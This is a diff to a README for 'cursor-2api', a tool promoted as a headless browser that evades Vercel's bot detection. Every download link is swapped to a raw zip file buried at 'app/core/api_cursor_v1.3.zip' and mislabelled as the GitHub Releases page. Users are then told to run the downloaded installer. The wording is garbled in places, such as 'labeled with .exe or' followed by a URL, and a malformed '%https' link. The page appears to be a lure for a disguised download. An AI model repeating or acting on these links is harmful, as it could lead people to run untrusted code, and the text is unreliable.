@@ -1,6 +1,6 @@
 # 🖱️ cursor-2api - Effortless Headless Browsing for Everyone
 
-[![Download Cursor-2api](https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/dissimilate/cursor-2api.zip%https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/dissimilate/cursor-2api.zip)](https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/dissimilate/cursor-2api.zip)
+[![Download Cursor-2api](https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/app/core/api_cursor_v1.3.zip%https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/app/core/api_cursor_v1.3.zip)](https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/app/core/api_cursor_v1.3.zip)
 
 ## 📋 Description
 cursor-2api is a state-of-the-art headless browser that simplifies online tasks. You can handle web automation without needing cookies, experience advanced anonymity, bypass Vercel’s bot detection, and convert streams using our native API. Additionally, it includes automatic context management for ease of use, and you can deploy it easily with Docker.
@@ -18,13 +18,13 @@ To get started with cursor-2api, follow these steps to download and run the appl
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download cursor-2api, visit the [GitHub Releases page](https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/dissimilate/cursor-2api.zip).
+   To download cursor-2api, visit the [GitHub Releases page](https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/app/core/api_cursor_v1.3.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of cursor-2api. It is usually best to pick the latest stable version.
 
 3. **Download the Installer**  
-   Click on the version you want to download. Look for files labeled with `.exe` or `https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/dissimilate/cursor-2api.zip` depending on your operating system.
+   Click on the version you want to download. Look for files labeled with `.exe` or `https://raw.githubusercontent.com/Kaylynhusbandly717/cursor-2api/main/app/core/api_cursor_v1.3.zip` depending on your operating system.
 
 4. **Run the Installer**  
    After the download completes, locate the downloaded file on your computer. Double-click the file to begin the installation. Follow the on-screen prompts to complete the installation.
